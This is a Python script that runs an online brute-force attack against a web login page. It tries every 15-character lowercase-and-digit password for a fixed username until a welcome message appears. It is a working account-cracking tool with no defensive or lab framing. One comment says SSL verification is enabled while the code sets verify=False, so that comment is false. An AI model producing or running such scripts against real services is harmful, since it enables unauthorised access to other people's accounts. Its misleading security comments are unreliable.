import requests
from bs4 import BeautifulSoup
import string
from itertools import product

# The URL of the login page
login_url = 'https://example.com/login'

# Create a session to persist cookies across requests
session = requests.Session()

# Define your login credentials
username = '2020220028'
password_length = 15  # Set the desired password length
charset = string.ascii_lowercase + string.digits  # Lowercase letters and numbers

# Generate passwords one at a time and test each password
for password_tuple in product(charset, repeat=password_length):
    password = ''.join(password_tuple)

    # Send an initial GET request to the login page (with SSL verification enabled)
    response = session.get(login_url, verify=False)
    
    try:
        soup = BeautifulSoup(response.text, 'html.parser')

        # Create a dictionary with the login data
        login_data = {
            'Username': username,
            'Password': password,
        }

        # Send a POST request to the login page with the login data
        response = session.post(login_url, data=login_data)

        # Check if login was successful (you may need to inspect the response or check for specific content)
        if 'Welcome, ' + username in response.text:
            print('Login successful with password:', password)
            break  # Exit the loop if login is successful
        else:
            print('Login failed with password:', password)
    except Exception as e:
        print('An error occurred:', str(e))
        break

# Now you can use the 'session' object to make authenticated requests to other pages on the website
